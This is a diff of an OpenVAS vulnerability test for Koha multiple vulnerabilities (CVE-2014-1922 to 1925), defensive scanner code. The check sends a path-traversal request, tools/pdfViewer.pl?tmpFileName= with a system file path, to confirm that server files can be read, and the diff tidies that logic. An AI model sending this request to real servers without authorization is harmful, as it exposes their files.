@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_koha_mult_vulns_02_14.nasl 5628 2017-03-20 15:27:40Z cfi $
+# $Id: gb_koha_mult_vulns_02_14.nasl 5698 2017-03-23 14:04:51Z cfi $
 #
 # Koha Multiple Vulnerabilities
 #
@@ -24,8 +24,6 @@
 # along with this program; if not, write to the Free Software
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
-
-SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103904";
 
 tag_insight = "Bug 11660: tools/pdfViewer.pl could be used to read arbitrary files on the server
 
@@ -51,20 +49,15 @@ tag_vuldetect = "Try to read a local file via tools/pdfViewer.pl.";
 
 if (description)
 {
- script_oid(SCRIPT_OID);
+ script_oid("1.3.6.1.4.1.25623.1.0.103904");
  script_cve_id("CVE-2014-1922","CVE-2014-1923","CVE-2014-1924","CVE-2014-1925");
  script_tag(name:"cvss_base", value:"6.4");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");
- script_version ("$Revision: 5628 $");
-
+ script_version ("$Revision: 5698 $");
  script_name("Koha Multiple Vulnerabilities");
-
-
  script_xref(name:"URL", value:"http://koha-community.org/security-release-february-2014/");
- 
- script_tag(name:"last_modification", value:"$Date: 2017-03-20 16:27:40 +0100 (Mon, 20 Mar 2017) $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-23 15:04:51 +0100 (Thu, 23 Mar 2017) $");
  script_tag(name:"creation_date", value:"2014-02-10 15:39:58 +0100 (Mon, 10 Feb 2014)");
- script_summary("Determine if it is possible to read a local file");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
@@ -83,32 +76,29 @@ if (description)
 }
 
 include("http_func.inc");
-include("host_details.inc");
 include("http_keepalive.inc");
-   
-port = get_http_port( default:80 );
-if( ! get_port_state( port ) ) exit( 0 );
+include("host_details.inc");
 
-dirs = make_list( cgi_dirs() );
+port = get_http_port( default:80 );
+
 files = traversal_files();
 
-foreach dir ( dirs )
-{
-  url = dir;
-  if( http_vuln_check( port:port, url:url, pattern:"Log in to Koha" ) )
-  {
-    foreach file ( keys( files ) )
-    {
+foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {
+
+  if( dir == "/" ) dir = "";
+  url = dir + "/";
+  res = http_get_cache( item:url, port:port );
+
+  if( "Log in to Koha" >< res ) {
+    foreach file( keys( files ) ) {
       url = dir + '/cgi-bin/koha/tools/pdfViewer.pl?tmpFileName=/' + files[file];
-      if( http_vuln_check( port:port, url:url, pattern:file ) )
-      {
-        security_message(port:port);
-        exit(0);
+      if( http_vuln_check( port:port, url:url, pattern:file ) ) {
+        report = report_vuln_url( port:port, url:url );
+        security_message( port:port, data:report );
+        exit( 0 );
       }
     }
-
   }
 }
 
-exit(0);
-
+exit( 0 );
